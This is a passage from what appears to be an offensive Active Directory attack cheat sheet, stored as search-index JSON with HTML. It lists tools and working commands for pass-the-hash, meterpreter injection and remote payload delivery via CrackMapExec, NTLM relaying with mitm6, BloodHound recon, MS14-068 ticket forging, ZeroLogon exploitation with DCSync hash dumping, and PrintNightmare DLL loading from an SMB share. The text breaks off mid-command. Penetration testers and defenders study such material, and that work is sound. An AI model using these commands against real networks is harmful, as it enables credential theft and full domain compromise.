<li>Using Meterpreter</li> <li>Using a ticket on Linux</li> <li>Pass-the-Ticket Silver Tickets</li> <li>Pass-the-Ticket Diamond Tickets</li> <li>Pass-the-Ticket Sapphire Tickets</li> </ul> </li> <li>Kerberoasting</li> <li>KRB_AS_REP Roasting</li> <li>Pass-the-Hash</li> <li>OverPass-the-Hash (pass the key)<ul> <li>Using impacket</li> <li>Using Rubeus</li> </ul> </li> <li>Capturing and cracking Net-NTLMv1/NTLMv1 hashes</li> <li>Capturing and cracking Net-NTLMv2/NTLMv2 hashes</li> <li>Man-in-the-Middle attacks &amp; relaying<ul> <li>MS08-068 NTLM reflection</li> <li>SMB Signing Disabled and IPv4</li> <li>SMB Signing Disabled and IPv6</li> <li>Drop the MIC</li> <li>Ghost Potato - CVE-2019-1384</li> <li>RemotePotato0 DCOM DCE RPC relay</li> <li>DNS Poisonning - Relay delegation with mitm6</li> <li>Relaying with WebDav Trick</li> </ul> </li> <li>Active Directory Certificate Services<ul> <li>ESC1 - Misconfigured Certificate Templates</li> <li>ESC2 - Misconfigured Certificate Templates</li> <li>ESC3 - Misconfigured Enrollment Agent Templates</li> <li>ESC4 - Access Control Vulnerabilities</li> <li>ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 </li> <li>ESC7 - Vulnerable Certificate Authority Access Control</li> <li>ESC8 - AD CS Relay Attack</li> <li>ESC9 - No Security Extension</li> <li>ESC11 - Relaying NTLM to ICPR</li> <li>Certifried CVE-2022-26923</li> <li>Pass-The-Certificate</li> </ul> </li> <li>Active Directory Federation Services<ul> <li>ADFS - Golden SAML</li> </ul> </li> <li>UnPAC The Hash</li> <li>Shadow Credentials</li> <li>Active Directory Groups<ul> <li>Dangerous Built-in Groups Usage</li> <li>Abusing DNS Admins Group</li> <li>Abusing Schema Admins Group</li> <li>Abusing Backup Operators Group</li> </ul> </li> <li>Abusing Active Directory ACLs/ACEs<ul> <li>GenericAll</li> <li>GenericWrite</li> <li>GenericWrite and Remote Connection Manager</li> <li>WriteDACL</li> <li>WriteOwner</li> <li>ReadLAPSPassword</li> <li>ReadGMSAPassword</li> <li>ForceChangePassword</li> </ul> </li> <li>DCOM Exploitation<ul> <li>DCOM via MMC Application Class </li> <li>DCOM via Excel</li> <li>DCOM via ShellExecute</li> </ul> </li> <li>Trust relationship between domains</li> <li>Child Domain to Forest Compromise - SID Hijacking</li> <li>Forest to Forest Compromise - Trust Ticket</li> <li>Privileged Access Management (PAM) Trust</li> <li>Kerberos Unconstrained Delegation<ul> <li>SpoolService Abuse with Unconstrained Delegation</li> <li>MS-EFSRPC Abuse with Unconstrained Delegation</li> </ul> </li> <li>Kerberos Constrained Delegation</li> <li>Kerberos Resource Based Constrained Delegation</li> <li>Kerberos Bronze Bit Attack - CVE-2020-17049</li> <li>PrivExchange attack</li> <li>SCCM Deployment</li> <li>SCCM Network Access Accounts</li> <li>SCCM Shares</li> <li>WSUS Deployment</li> <li>RODC - Read Only Domain Controller<ul> <li>RODC Golden Ticket</li> <li>RODC Key List Attack</li> <li>RODC Computer Object</li> </ul> </li> <li>PXE Boot image attack</li> <li>DSRM Credentials</li> <li>DNS Reconnaissance</li> <li>Linux Active Directory<ul> <li>CCACHE ticket reuse from /tmp</li> <li>CCACHE ticket reuse from keyring</li> <li>CCACHE ticket reuse from SSSD KCM</li> <li>CCACHE ticket reuse from keytab</li> <li>Extract accounts from /etc/krb5.keytab</li> </ul> </li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#tools","title":"Tools","text":"<ul> <li>Impacket or the Windows version</li> <li>Responder</li> <li>InveighZero</li> <li>Mimikatz</li> <li>Ranger</li> <li>AdExplorer</li> <li>CrackMapExec</li> </ul> <pre><code># use the latest release, CME is now a binary packaged will all its dependencies\nroot@payload$ wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip\n# execute cme (smb, winrm, mssql, ...)\nroot@payload$ cme smb -L\nroot@payload$ cme smb -M name_module -o VAR=DATA\nroot@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth\nroot@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares\nroot@payload$ cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher\nroot@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable\nroot@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443\nroot@payload$ cme smb 192.168.1.100 -u Administrator -H \":5858d47a41e40b40f294b3100bea611f\" -M web_delivery -o URL=\"https://IP:PORT/posh-payload\"\nroot@payload$ cme smb 192.168.1.100 -u Administrator -H \":5858d47a41e40b40f294b3100bea611f\" --exec-method smbexec -X 'whoami'\nroot@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz\nroot@payload$ cme mimikatz --server http --server-port 80\n</code></pre> <ul> <li>Mitm6</li> </ul> <pre><code>git clone https://github.com/fox-it/mitm6.git &amp;&amp; cd mitm6\npip install .\nmitm6 -d lab.local\nntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i\n# -wh: Server hosting WPAD file (Attacker\u2019s IP)\n# -t: Target (You cannot relay credentials to the same device that you\u2019re spoofing)\n# -i: open an interactive shell\nntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access\n</code></pre> <ul> <li>ADRecon</li> </ul> <pre><code>.\\ADRecon.ps1 -DomainController MYAD.net -Credential MYAD\\myuser\n</code></pre> <ul> <li> <p>Active Directory Assessment and Privilege Escalation Script</p> <pre><code>powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 \n</code></pre> </li> <li> <p>Ping Castle</p> <pre><code>pingcastle.exe --healthcheck --server &lt;DOMAIN_CONTROLLER_IP&gt; --user &lt;USERNAME&gt; --password &lt;PASSWORD&gt; --advanced-live --nullsession\npingcastle.exe --healthcheck --server domain.local\npingcastle.exe --graph --server domain.local\npingcastle.exe --scanner scanner_name --server domain.local\navailable scanners are:aclcheck,antivirus,computerversion,foreignusers,laps_bitlocker,localadmin,nullsession,nullsession-trust,oxidbindings,remote,share,smb,smb3querynetwork,spooler,startup,zerologon,computers,users\n</code></pre> </li> <li> <p>Kerbrute</p> <pre><code>./kerbrute passwordspray -d &lt;DOMAIN&gt; &lt;USERS.TXT&gt; &lt;PASSWORD&gt;\n</code></pre> </li> <li> <p>Rubeus</p> <pre><code>Rubeus.exe asktgt /user:USER &lt;/password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]\nRubeus.exe dump [/service:SERVICE] [/luid:LOGINID]\nRubeus.exe klist [/luid:LOGINID]\nRubeus.exe kerberoast [/spn:\"blah/blah\"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"]\n</code></pre> </li> <li> <p>AutomatedLab <pre><code>New-LabDefinition -Name GettingStarted -DefaultVirtualizationEngine HyperV\nAdd-LabMachineDefinition -Name FirstServer -OperatingSystem 'Windows Server 2016 SERVERSTANDARD'\nInstall-Lab\nShow-LabDeploymentSummary\n</code></pre></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#kerberos-clock-synchronization","title":"Kerberos Clock Synchronization","text":"<p>In Kerberos, time is used to ensure that tickets are valid. To achieve this, the clocks of all Kerberos clients and servers in a realm must be synchronized to within a certain tolerance. The default clock skew tolerance in Kerberos is <code>5 minutes</code>, which means that the difference in time between the clocks of any two Kerberos entities should be no more than 5 minutes.</p> <ul> <li>Detect clock skew automatically with <code>nmap</code> <pre><code>$ nmap -sV -sC 10.10.10.10\nclock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s\n</code></pre></li> <li>Compute yourself the difference between the clocks   <pre><code>nmap -sT 10.10.10.10 -p445 --script smb2-time -vv\n</code></pre></li> <li>Fix #1: Modify your clock   <pre><code>sudo date -s \"14 APR 2015 18:25:16\" # Linux\nnet time /domain /set # Windows\n</code></pre></li> <li>Fix #2: Fake your clock   <pre><code>faketime -f '+8h' date\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#active-directory-recon","title":"Active Directory Recon","text":""},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-bloodhound","title":"Using BloodHound","text":"<p>Use the correct collector * AzureHound for Azure Active Directory * SharpHound for local Active Directory * RustHound for local Active Directory</p> <ul> <li> <p>use BloodHoundAD/AzureHound (more info: Cloud - Azure Pentest)</p> </li> <li> <p>use BloodHoundAD/BloodHound <pre><code># run the collector on the machine using SharpHound.exe\n# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe\n# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe\n.\\SharpHound.exe -c all -d active.htb --searchforest\n.\\SharpHound.exe -c all,GPOLocalGroup # all collection doesn't include GPOLocalGroup by default\n.\\SharpHound.exe --CollectionMethod DCOnly # only collect from the DC, doesn't query the computers (more stealthy)\n.\\SharpHound.exe -c all --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --JSONFolder &lt;PathToFile&gt;\n.\\SharpHound.exe -c all --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --domaincontroller 10.10.10.100 -d active.htb\n.\\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\\Windows\\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23\n# or run the collector on the machine using Powershell\n# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1\n# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1\nInvoke-BloodHound -SearchForest -CSVFolder C:\\Users\\Public\nInvoke-BloodHound -CollectionMethod All  -LDAPUser &lt;UserName&gt; -LDAPPass &lt;Password&gt; -OutputDirectory &lt;PathToFile&gt;\n# or remotely via BloodHound Python\n# https://github.com/fox-it/BloodHound.py\npip install bloodhound\nbloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all\n# or locally/remotely from an ADExplorer snapshot from SysInternals (ADExplorer remains a legitimate binary signed by Microsoft, avoiding detection with security solutions)\n# https://github.com/c3c/ADExplorerSnapshot.py\npip3 install --user .\nADExplorerSnapshot.py &lt;snapshot path&gt; -o &lt;*.json output folder path&gt;\n</code></pre></p> </li> <li>Collect more data for certificates exploitation using Certipy   <pre><code>certipy find 'corp.local/john:Passw0rd@dc.corp.local' -bloodhound\ncertipy find 'corp.local/john:Passw0rd@dc.corp.local' -old-bloodhound\ncertipy find 'corp.local/john:Passw0rd@dc.corp.local' -vulnerable -hide-admins -username user@domain -password Password123\n</code></pre></li> <li>use OPENCYBER-FR/RustHound <pre><code># Windows with GSSAPI session\nrusthound.exe -d domain.local --ldapfqdn domain\n# Windows/Linux simple bind connection username:password\nrusthound.exe -d domain.local -u user@domain.local -p Password123 -o output -z\n# Linux with username:password and ADCS module for @ly4k BloodHound version\nrusthound -d domain.local -u 'user@domain.local' -p 'Password123' -o /tmp/adcs --adcs -z\n</code></pre></li> </ul> <p>Then import the zip/json files into the Neo4J database and query them.</p> <pre><code>root@payload$ apt install bloodhound \n# start BloodHound and the database\nroot@payload$ neo4j console\n# or use docker\nroot@payload$ docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j\nroot@payload$ ./bloodhound --no-sandbox\nGo to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j\n</code></pre> <p>You can add some custom queries like : * Bloodhound-Custom-Queries from @hausec * BloodHoundQueries from CompassSecurity * BloodHound Custom Queries from Exegol - @ShutdownRepo * Certipy BloodHound Custom Queries from ly4k</p> <p>Replace the customqueries.json file located at <code>/home/username/.config/bloodhound/customqueries.json</code> or <code>C:\\Users\\USERNAME\\AppData\\Roaming\\BloodHound\\customqueries.json</code>.</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-powerview","title":"Using PowerView","text":"<ul> <li>Get Current Domain: <code>Get-NetDomain</code></li> <li>Enum Other Domains: <code>Get-NetDomain -Domain &lt;DomainName&gt;</code></li> <li>Get Domain SID: <code>Get-DomainSID</code></li> <li>Get Domain Policy: <pre><code>Get-DomainPolicy\n#Will show us the policy configurations of the Domain about system access or kerberos\n(Get-DomainPolicy).\"system access\"\n(Get-DomainPolicy).\"kerberos policy\"\n</code></pre></li> <li>Get Domain Controlers: <pre><code>Get-NetDomainController\nGet-NetDomainController -Domain &lt;DomainName&gt;\n</code></pre></li> <li>Enumerate Domain Users: <pre><code>Get-NetUser\nGet-NetUser -SamAccountName &lt;user&gt; \nGet-NetUser | select cn\nGet-UserProperty\n#Check last password change\nGet-UserProperty -Properties pwdlastset\n#Get a spesific \"string\" on a user's attribute\nFind-UserField -SearchField Description -SearchTerm \"wtver\"\n#Enumerate user logged on a machine\nGet-NetLoggedon -ComputerName &lt;ComputerName&gt;\n#Enumerate Session Information for a machine\nGet-NetSession -ComputerName &lt;ComputerName&gt;\n#Enumerate domain machines of the current/specified domain where specific users are logged into\nFind-DomainUserLocation -Domain &lt;DomainName&gt; | Select-Object UserName, SessionFromName\n</code></pre></li> <li>Enum Domain Computers: <pre><code>Get-NetComputer -FullData\nGet-DomainGroup\n#Enumerate Live machines \nGet-NetComputer -Ping\n</code></pre></li> <li>Enum Groups and Group Members: <pre><code>Get-NetGroupMember -GroupName \"&lt;GroupName&gt;\" -Domain &lt;DomainName&gt;\n#Enumerate the members of a specified group of the domain\nGet-DomainGroup -Identity &lt;GroupName&gt; | Select-Object -ExpandProperty Member\n#Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences\nGet-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName\n</code></pre></li> <li>Enumerate Shares <pre><code>#Enumerate Domain Shares\nFind-DomainShare\n#Enumerate Domain Shares the current user has access\nFind-DomainShare -CheckShareAccess\n</code></pre></li> <li>Enum Group Policies: <pre><code>Get-NetGPO\n# Shows active Policy on specified machine\nGet-NetGPO -ComputerName &lt;Name of the PC&gt;\nGet-NetGPOGroup\n#Get users that are part of a Machine's local Admin group\nFind-GPOComputerAdmin -ComputerName &lt;ComputerName&gt;\n</code></pre></li> <li>Enum OUs: <pre><code>Get-NetOU -FullData \nGet-NetGPO -GPOname &lt;The GUID of the GPO&gt;\n</code></pre></li> <li>Enum ACLs: <pre><code># Returns the ACLs associated with the specified account\nGet-ObjectAcl -SamAccountName &lt;AccountName&gt; -ResolveGUIDs\nGet-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose\n#Search for interesting ACEs\nInvoke-ACLScanner -ResolveGUIDs\n#Check the ACLs associated with a specified path (e.g smb share)\nGet-PathAcl -Path \"\\\\Path\\Of\\A\\Share\"\n</code></pre></li> <li>Enum Domain Trust: <pre><code>Get-NetDomainTrust\nGet-NetDomainTrust -Domain &lt;DomainName&gt;\n</code></pre></li> <li>Enum Forest Trust: <pre><code>Get-NetForestDomain\nGet-NetForestDomain Forest &lt;ForestName&gt;\n#Domains of Forest Enumeration\nGet-NetForestDomain\nGet-NetForestDomain Forest &lt;ForestName&gt;\n#Map the Trust of the Forest\nGet-NetForestTrust\nGet-NetDomainTrust -Forest &lt;ForestName&gt;\n</code></pre></li> <li>User Hunting: <pre><code>#Finds all machines on the current domain where the current user has local admin access\nFind-LocalAdminAccess -Verbose\n#Find local admins on all machines of the domain:\nInvoke-EnumerateLocalAdmin -Verbose\n#Find computers were a Domain Admin OR a specified user has a session\nInvoke-UserHunter\nInvoke-UserHunter -GroupName \"RDPUsers\"\nInvoke-UserHunter -Stealth\n#Confirming admin access:\nInvoke-UserHunter -CheckAccess\n</code></pre>   :heavy_exclamation_mark: Priv Esc to Domain Admin with User Hunting: \\   I have local admin access on a machine -&gt; A Domain Admin has a session on that machine -&gt; I steal his token and impersonate him -&gt;    Profit!</li> </ul> <p>PowerView 3.0 Tricks</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-ad-module","title":"Using AD Module","text":"<ul> <li>Get Current Domain: <code>Get-ADDomain</code></li> <li>Enum Other Domains: <code>Get-ADDomain -Identity &lt;Domain&gt;</code></li> <li>Get Domain SID: <code>Get-DomainSID</code></li> <li>Get Domain Controlers: </li> </ul> <pre><code>Get-ADDomainController\nGet-ADDomainController -Identity &lt;DomainName&gt;\n</code></pre> <ul> <li>Enumerate Domain Users: <pre><code>Get-ADUser -Filter * -Identity &lt;user&gt; -Properties *\n#Get a spesific \"string\" on a user's attribute\nGet-ADUser -Filter 'Description -like \"*wtver*\"' -Properties Description | select Name, Description\n</code></pre></li> <li>Enum Domain Computers: <pre><code>Get-ADComputer -Filter * -Properties *\nGet-ADGroup -Filter * \n</code></pre></li> <li>Enum Domain Trust: <pre><code>Get-ADTrust -Filter *\nGet-ADTrust -Identity &lt;DomainName&gt;\n</code></pre></li> <li>Enum Forest Trust: <pre><code>Get-ADForest\nGet-ADForest -Identity &lt;ForestName&gt;\n#Domains of Forest Enumeration\n(Get-ADForest).Domains\n</code></pre></li> <li>Enum Local AppLocker Effective Policy: <pre><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#other-interesting-commands","title":"Other Interesting Commands","text":"<ul> <li>Find Domain Controllers <pre><code>nslookup domain.com\nnslookup -type=srv _ldap._tcp.dc._msdcs.&lt;domain&gt;.com\nnltest /dclist:domain.com\nGet-ADDomainController -filter * | Select-Object name\ngpresult /r\n$Env:LOGONSERVER \necho %LOGONSERVER%\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#from-cve-to-system-shell-on-dc","title":"From CVE to SYSTEM shell on DC","text":"<p>Sometimes you will find a Domain Controller without the latest patches installed, use the newest CVE to gain a SYSTEM shell on it. If you have a \"normal user\" shell on the DC you can also try to elevate your privileges using one of the methods listed in Windows - Privilege Escalation</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#ms14-068-checksum-validation","title":"MS14-068 Checksum Validation","text":"<p>This exploit require to know the user SID, you can use <code>rpcclient</code> to remotely get it or <code>wmi</code> if you have an access on the machine.</p> <ul> <li>RPCClient   <pre><code>rpcclient $&gt; lookupnames john.smith\njohn.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1)\n</code></pre></li> <li>WMI   <pre><code>wmic useraccount get name,sid\nAdministrator  S-1-5-21-3415849876-833628785-5197346142-500   \nGuest          S-1-5-21-3415849876-833628785-5197346142-501   \nAdministrator  S-1-5-21-297520375-2634728305-5197346142-500   \nGuest          S-1-5-21-297520375-2634728305-5197346142-501   \nkrbtgt         S-1-5-21-297520375-2634728305-5197346142-502   \nlambda         S-1-5-21-297520375-2634728305-5197346142-1110 \n</code></pre></li> <li>Powerview   <pre><code>Convert-NameToSid high-sec-corp.localkrbtgt\nS-1-5-21-2941561648-383941485-1389968811-502\n</code></pre></li> <li>CrackMapExec: <code>crackmapexec ldap DC1.lab.local -u username -p password -k --get-sid</code> </li> </ul> <pre><code>Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068\n</code></pre> <p>Generate a ticket with <code>metasploit</code> or <code>pykek</code></p> <pre><code>Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum\nName      Current Setting                                Required  Description\n----      ---------------                                --------  -----------\nDOMAIN    LABDOMAIN.LOCAL                                yes       The Domain (upper case) Ex: DEMO.LOCAL\nPASSWORD  P@ssw0rd                                       yes       The Domain User password\nRHOSTS    10.10.10.10                                    yes       The target address range or CIDR identifier\nRPORT     88                                             yes       The target port\nTimeout   10                                             yes       The TCP timeout to establish connection and read data\nUSER      lambda                                         yes       The Domain User\nUSER_SID  S-1-5-21-297520375-2634728305-5197346142-1106  yes       The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000\n</code></pre> <pre><code># Alternative download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek\n$ git clone https://github.com/SecWiki/windows-kernel-exploits\n$ python ./ms14-068.py -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt; -p &lt;clearPassword&gt;\n$ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org\n$ python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10\n$ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066\n-1105\n[+] Building AS-REQ for msfdc01.metasploitable.local... Done!\n[+] Sending AS-REQ to msfdc01.metasploitable.local... Done!\n[+] Receiving AS-REP from msfdc01.metasploitable.local... Done!\n[+] Parsing AS-REP from msfdc01.metasploitable.local... Done!\n[+] Building TGS-REQ for msfdc01.metasploitable.local... Done!\n[+] Sending TGS-REQ to msfdc01.metasploitable.local... Done!\n[+] Receiving TGS-REP from msfdc01.metasploitable.local... Done!\n[+] Parsing TGS-REP from msfdc01.metasploitable.local... Done!\n[+] Creating ccache file 'TGT_user01@metasploitable.local.ccache'... Done!\n</code></pre> <p>Then use <code>mimikatz</code> to load the ticket.</p> <pre><code>mimikatz.exe \"kerberos::ptc c:\\temp\\TGT_darthsidious@lab.adsecurity.org.ccache\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#mitigations","title":"Mitigations","text":"<ul> <li>Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780</li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#zerologon","title":"ZeroLogon","text":"<p>CVE-2020-1472</p> <p>White Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055</p> <p>Exploit steps from the white paper</p> <ol> <li>Spoofing the client credential</li> <li>Disabling signing and sealing</li> <li>Spoofing a call</li> <li>Changing a computer's AD password to null</li> <li>From password change to domain admin</li> <li> <p> reset the computer's AD password in a proper way to avoid any Deny of Service</p> </li> <li> <p><code>cve-2020-1472-exploit.py</code> - Python script from dirkjanm <pre><code>  # Check (https://github.com/SecuraBV/CVE-2020-1472)\nproxychains python3 zerologon_tester.py DC01 172.16.1.5\n$ git clone https://github.com/dirkjanm/CVE-2020-1472.git\n# Activate a virtual env to install impacket\n$ python3 -m venv venv\n$ source venv/bin/activate\n$ pip3 install .\n# Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)\nproxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5\n# Find the old NT hash of the DC\nproxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'\n# Restore password from secretsdump \n# secretsdump will automatically dump the plaintext machine password (hex encoded) \n# when dumping the local registry secrets on the newest version\npython restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3\ndeactivate\n</code></pre></p> </li> <li> <p><code>nccfsas</code> - .NET binary for Cobalt Strike's execute-assembly   <pre><code>git clone https://github.com/nccgroup/nccfsas\n# Check\nexecute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local\n# Resetting the machine account password\nexecute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset\n# Testing from a non Domain-joined machine\nexecute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch\n# Now reset the password back\n</code></pre></p> </li> <li> <p><code>Mimikatz</code> - 2.2.0 20200917 Post-Zerologon   <pre><code>privilege::debug\n# Check for the CVE\nlsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$\n# Exploit the CVE and set the computer account's password to \"\"\nlsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit\n# Execute dcsync to extract some hashes\nlsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:\"\" /authntlm\nlsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ /authdomain:LAB /authpassword:\"\" /authntlm\n# Pass The Hash with the extracted Domain Admin hash\nsekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN\n# Use IP address instead of FQDN to force NTLM with Windows APIs \n# Reset password to Waza1234/Waza1234/Waza1234/\n# https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584\nlsadump::postzerologon /target:10.10.10.10 /account:DC01$\n</code></pre></p> </li> <li> <p><code>CrackMapExec</code> - only check   <pre><code>crackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon\n</code></pre></p> </li> </ol> <p>A 2nd approach to exploit zerologon is done by relaying authentication.</p> <p>This technique, found by dirkjanm, requires more prerequisites but has the advantage of having no impact on service continuity. The following prerequisites are needed: * A domain account * One DC running the <code>PrintSpooler</code> service * Another DC vulnerable to zerologon</p> <ul> <li><code>ntlmrelayx</code> - from Impacket and any tool such as <code>printerbug.py</code> <pre><code># Check if one DC is running the PrintSpooler service\nrpcdump.py 10.10.10.10 | grep -A 6 \"spoolsv\"\n# Setup ntlmrelay in one shell\nntlmrelayx.py -t dcsync://DC01.LAB.LOCAL -smb2support\n#Trigger printerbug in 2nd shell\npython3 printerbug.py 'LAB.LOCAL'/joe:Password123@10.10.10.10 10.10.10.12\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#printnightmare","title":"PrintNightmare","text":"<p>CVE-2021-1675 / CVE-2021-34527</p> <p>The DLL will be stored in <code>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\</code>. The exploit will execute the DLL either from the local filesystem or a remote share.</p> <p>Requirements: * Spooler Service enabled (Mandatory) * Server with patches &lt; June 2021 * DC with <code>Pre Windows 2000 Compatibility</code> group * Server with registry key <code>HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\\NoWarningNoElevationOnInstall</code> = (DWORD) 1 * Server with registry key <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA</code> = (DWORD) 0</p> <p>Detect the vulnerability: * Impacket - rpcdump <pre><code>python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR'\nProtocol: [MS-RPRN]: Print System Remote Protocol\n</code></pre> * It Was All A Dream <pre><code>git clone https://github.com/byt3bl33d3r/ItWasAllADream\ncd ItWasAllADream &amp;&amp; poetry install &amp;&amp; poetry shell\nitwasalladream -u user -p Password123 -d domain 10.10.10.10/24\ndocker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10\n</code></pre></p> <p>Payload Hosting:  * The payload can be hosted on Impacket SMB server since PR #1109: <pre><code>python3 ./smbserver.py share /tmp/smb/\n</code></pre> * Using Invoke-BuildAnonymousSMBServer (Admin rights required on host):  <pre><code>Import-Module .\\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\\Share -Mode Enable\n</code></pre> * Using WebDav with SharpWebServer (Doesn't require admin rights): <pre><code>SharpWebServer.exe port=8888 dir=c:\\users\\public verbose=true\n</code></pre> When using WebDav instead of SMB, you must add <code>@[PORT]</code> to the hostname in the URI, e.g.: <code>\\\\172.16.1.5@8888\\Downloads\\beacon.dll</code> WebDav client must be activated on exploited target. By default it is not activated on Windows workstations (you have to <code>net start webclient</code>) and it's not installed on servers. Here is how to detect activated webdav: <pre><code>cme smb -u user -p password -d domain.local -M webdav [TARGET]\n</code></pre></p> <p>Trigger the exploit: </p> <ul> <li>SharpNightmare <pre><code># require a modified Impacket: https://github.com/cube0x0/impacket\npython3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll'\npython3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\\addCube.dll'\n## LPE\nSharpPrintNightmare.exe C:\\addCube.dll\n## RCE using existing context\nSharpPrintNightmare.exe '\\\\192.168.1.215\\smb\\addCube.dll' 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_addb31f9bff9e936\\Amd64\\UNIDRV.DLL' '\\\\192.168.1.20'\n## RCE using runas /netonly\nSharpPrintNightmare.exe '\\\\192.168.1.215\\smb\\addCube.dll'  'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL' '\\\\192.168.1.10' hackit.local domain_user Pass123\n</code></pre></li> <li>Invoke-Nightmare <pre><code>## LPE only (PS1 + DLL)\nImport-Module .\\cve-2021-1675.ps1\nInvoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default\nInvoke-Nightmare -DriverName \"Dementor\" -NewUser \"d3m3nt0r\" -NewPassword 